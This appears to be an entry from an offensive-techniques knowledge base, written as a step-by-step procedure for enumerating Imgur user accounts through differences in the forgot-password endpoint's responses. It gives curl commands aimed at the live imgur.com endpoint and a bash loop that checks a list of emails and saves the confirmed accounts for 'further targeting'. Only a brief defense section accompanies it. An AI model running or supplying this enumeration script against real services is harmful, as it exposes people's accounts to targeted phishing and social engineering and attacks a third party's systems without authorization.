---
tags:
  - information-disclosure
  - account-enumeration
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-imgur-auth-test]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Account Discovery]]'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
id: f9d5afac-330c-4a76-b25e-b6d7f5cd6fcf
created_at: '2025-12-14T17:25:13.146Z'
updated_at: '2025-12-14T17:25:13.146Z'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Imgur Account Enumeration via Response Differences

## Summary

This procedure exploits an information disclosure vulnerability in Imgur's forgot password and login endpoints by sending authentication requests and analyzing server responses. Non-existent emails trigger a unique error message ("That username or email was not found."), while valid ones receive a different response, enabling attackers to enumerate active accounts without rate limiting.

## Description

In the attack scenario, an external attacker targets Imgur's web authentication flows. By submitting POST requests to the forgot password or login endpoints with varying email addresses, the attacker distinguishes valid accounts based on response text. The root cause is inconsistent error handling: explicit disclosure for invalid inputs versus ambiguous success for valid ones. No rate limiting allows automation, leading to privacy risks like targeted social engineering. Prerequisites include basic HTTP knowledge; outcomes include a list of confirmed user emails.

## Requirements

1. Internet access to Imgur's public endpoints
2. HTTP client (e.g., curl or browser)
3. List of target emails for testing

## Defense

Defensive measures and detection strategies:

- Implement uniform error messages (e.g., always return "If an account exists, a reset link has been sent")
- Enforce rate limiting on authentication endpoints (e.g., 10 requests per minute per IP)
- Monitor for anomalous request volumes to auth endpoints via WAF logs

## Objectives

1. Identify valid Imgur accounts through response analysis
2. Compile a list of existent emails for further targeting
3. Demonstrate the impact of information disclosure on user privacy

## Instructions

### Step 1: Baseline Non-Existent Response

**Context**: Send a request with a fabricated email to capture the distinguishing error message.

**Command** ([[commands/curl-imgur-auth-test]]):
```bash
curl -X POST 'https://imgur.com/account/forgot_password' -d 'email=nonexistent@example.com' -H 'Content-Type: application/x-www-form-urlencoded'
```

> This command submits a forgot password request. Expected output includes the JSON or HTML response with "That username or email was not found."

### Step 2: Test Target Email

**Context**: Repeat with a real or suspected valid email to observe the variance.

**Command** ([[commands/curl-imgur-auth-test]]):
```bash
curl -X POST 'https://imgur.com/account/forgot_password' -d 'email=target@example.com' -H 'Content-Type: application/x-www-form-urlencoded'
```

> Successful execution shows a response without the "not found" error, such as a success message or redirect implying account existence.

### Step 3: Automate for Multiple Emails

**Context**: Loop through a list of emails, logging valid ones based on response parsing.

**Command** ([[commands/curl-imgur-auth-test]]):
```bash
for email in $(cat emails.txt); do
  response=$(curl -s -X POST 'https://imgur.com/account/forgot_password' -d "email=$email" -H 'Content-Type: application/x-www-form-urlencoded')
  if [[ ! $response =~ "not found" ]]; then
    echo "Valid account: $email" >> valid_accounts.txt
  fi

done
```

> This scales the enumeration. Expected output: A file with confirmed valid emails; no rate limit interruptions.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-imgur-auth-test]]

## Tools Used


## Tags

- information-disclosure
- account-enumeration
- web
